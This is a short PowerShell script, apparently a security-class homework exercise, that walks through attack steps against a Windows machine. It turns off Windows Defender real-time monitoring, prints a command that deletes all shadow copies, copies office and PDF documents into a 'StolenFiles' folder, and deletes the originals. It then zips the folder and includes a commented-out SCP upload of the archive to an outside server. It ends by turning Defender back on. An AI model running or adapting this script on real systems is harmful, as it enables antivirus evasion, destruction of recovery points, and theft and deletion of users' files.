# Question 2 disabling Windows Defender

# Disable windows defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Removing restore points (Only having it printed to the screen because don't want it to delete mine)
Write-Output "vssadmin delete shadows /all"


# Question 1: Search through the File System fo docx, xlsx, pdf and txt files and copy those to a file
# Gets a list of all the files
Get-ChildItem -Recurse -Include *.pdf,*.docx,*.txt,*.xlsx -Path .\Week13\class\Documents | Export-CSV -Path .\Week13\class\hwfiles.csv

# Import CSV File
$filelist = import-csv -Path ./Week13/class/hwfiles.csv -header FullName

# Directory to store stolen files:
New-Item -Path .\Week13\class\StolenFiles -ItemType Directory

# Loop through the files and move them to our StolenFiles directory

# Loop through the results
foreach ($f in $filelist) {

    Copy-Item $f.FullName -Destination .\Week13\class\StolenFiles
    # Delete the files we copied so the target no longer has them!
    Remove-Item -Path $f.FullName

}

# Question 1 B:

# Zip all the files in the stolenFiles directory
Compress-Archive -Path .\Week13\class\StolenFiles -DestinationPath .\Week13\class\stolen.Zip -Force


# Finally SCP them to the server!
#Set-SCPFile -ComputerName '192.168.6.71' -Credential (Get-Credential sys320)` -Path .\Week13\class\stolen.Zip`
#-Destination "/home/systest"

# What we turn off we must turn back on!
Set-MpPreference -DisableRealtimeMonitoring $false

